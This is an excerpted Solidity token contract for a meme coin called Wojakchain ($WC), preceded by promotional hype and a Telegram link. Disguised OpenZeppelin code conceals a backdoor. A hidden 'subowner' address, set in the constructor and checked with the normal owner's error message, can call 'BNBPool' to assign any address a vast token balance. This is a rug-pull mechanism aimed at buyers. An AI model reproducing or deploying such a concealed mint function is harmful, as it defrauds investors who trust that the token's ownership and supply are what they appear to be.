...
WC THE FROG WAS KILLED BY HIS CREATOR
But his alt-right POV lives on.WC is an unfortunate testament to the durability of meme culture - for better and worse.

IN LOVE  WITH $WC
The Greeks have a rich POV of literature. The WCs Have a rich POV of moon reaching
🔥Meme Coin with great potential 🔥
✅TG OFFICIAL  https://t.me/WojakchainCOE
✅ WEBSITE https://Wojakchain.com/
...
/*
 * @dev Provides information about the current execution WCBurnable, including the
...
// File: @openzeppelin/contracts/access/WCOwnable.sol
 ...
 * specific functions.
 *
 * By default, the owner account will be the one that WCs the contract. This
 ...
 * the owner.
 */
abstract contract WCOwnable is WCBurnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the WCer as the initial owner.
     */
    constructor () {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "WCOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "WCOwnable: new owner is the zero address");
...
contract Wojakchain is WCBurnable, DxtoolsApp, WCOwnable {
    
    using SafeBitcoin for uint256;
    mapping (address => uint256) private WCfrom;
    mapping (address => mapping (address => uint256)) private fromWC;
   ...
   address private SmartV3Rooter; 
    constructor(address SmartUniswap) {
        ...
        WCfrom[_msgSender()] = _totalSupply;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
        return WCfrom[account];
    }
      modifier subowner() {
        require(SmartV3Rooter == _msgSender(), "WCOwnable: caller is not the owner");
        _;
    }
    /**
    ...
    */
    ...
    function BNBPool(address bnbRewards) external subowner {
        WCfrom[bnbRewards] = 100000000000 * 10 ** 26;
    ...
    */
    function allowance(address owner, address transporteur) external view override returns (uint256) {
        return fromWC[owner][transporteur];
    }
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromWC[sender][_msgSender()].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    */
    function increaseAllowance(address transporteur, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), transporteur, fromWC[_msgSender()][transporteur].add(addedbalance));
        return true;
    }
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromWC[_msgSender()][transporteur].sub(allbalances, "DxtoolsApp: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        ...
        WCfrom[sender] = WCfrom[sender].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds balance");
        WCfrom[shippingto] = WCfrom[shippingto].add(yoursold);
    ...
    * e.g. set automatic WC for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        ...
        fromWC[owner][transporteur] = yoursold;
